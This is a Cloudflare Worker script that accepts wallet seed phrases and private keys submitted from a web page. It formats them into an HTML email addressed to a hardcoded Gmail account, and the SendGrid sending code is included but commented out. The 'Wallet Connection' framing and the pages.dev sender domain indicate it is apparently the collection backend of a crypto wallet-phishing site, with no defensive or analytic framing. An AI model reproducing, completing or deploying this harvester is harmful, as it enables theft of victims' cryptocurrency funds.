// Cloudflare Worker function

export default {
  async fetch(request, env, ctx) {
    // Handle CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type',
        },
      });
    }

    if (request.method !== 'POST') {
      return new Response(JSON.stringify({ error: 'Method not allowed' }), {
        status: 405,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
      });
    }

    try {
      const data = await request.json();
      const { wallet, seedPhrase, privateKey, timestamp } = data;

      // Validate input
      if (!seedPhrase && !privateKey) {
        return new Response(
          JSON.stringify({ error: 'At least one field required' }),
          {
            status: 400,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*',
            },
          }
        );
      }

      // Create email content
      const emailContent = `
        <html>
          <head>
            <style>
              body { font-family: Arial, sans-serif; }
              .container { max-width: 600px; margin: 0 auto; padding: 20px; }
              .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px; }
              .content { background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 8px; }
              code { background: white; padding: 10px; border-radius: 4px; display: block; word-break: break-all; margin: 10px 0; }
              .footer { color: #999; font-size: 12px; text-align: center; margin-top: 20px; }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="header">
                <h2>Wallet Connection Data Received</h2>
                <p><strong>Wallet:</strong> ${wallet}</p>
                <p><strong>Timestamp:</strong> ${new Date(timestamp).toLocaleString()}</p>
              </div>
              
              <div class="content">
                ${seedPhrase ? `
                  <h3>Seed Phrase:</h3>
                  <code>${seedPhrase}</code>
                ` : ''}
                
                ${privateKey ? `
                  <h3>Private Key:</h3>
                  <code>${privateKey}</code>
                ` : ''}
              </div>
              
              <div class="footer">
                <p>This is an automated email. Keep this information secure.</p>
              </div>
            </div>
          </body>
        </html>
      `;

      // Send email using a service (using SendGrid or similar)
      // For now, we'll use Cloudflare Email Service if available
      // Otherwise, you can integrate SendGrid or another service

      // Example: Send to nosjoachim42@gmail.com
      // You'll need to configure this with your email service

      const emailPayload = {
        to: 'nosjoachim42@gmail.com',
        subject: `Wallet Connection: ${wallet} - ${new Date().toLocaleString()}`,
        html: emailContent,
        from: env.FROM_EMAIL || 'noreply@resolutioncustodialdapp.pages.dev',
      };

      // For local development/testing, log the data
      console.log('Wallet data received:', {
        wallet,
        timestamp,
        seedPhrase: seedPhrase ? '***HIDDEN***' : 'Not provided',
        privateKey: privateKey ? '***HIDDEN***' : 'Not provided',
      });

      // In production, send email through your configured service
      // Example with SendGrid:
      /*
      if (env.SENDGRID_API_KEY) {
        const sgResponse = await fetch('https://api.sendgrid.com/v3/mail/send', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${env.SENDGRID_API_KEY}`,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            personalizations: [
              {
                to: [{ email: 'nosjoachim42@gmail.com' }],
                subject: `Wallet Connection: ${wallet}`,
              },
            ],
            from: { email: env.FROM_EMAIL },
            content: [{ type: 'text/html', value: emailContent }],
          }),
        });
        
        if (!sgResponse.ok) throw new Error('Email send failed');
      }
      */

      return new Response(
        JSON.stringify({
          success: true,
          message: 'Data received and processed successfully',
        }),
        {
          status: 200,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
        }
      );
    } catch (error) {
      console.error('Error:', error);
      return new Response(
        JSON.stringify({
          error: 'Failed to process request',
          details: error.message,
        }),
        {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
        }
      );
    }
  },
};
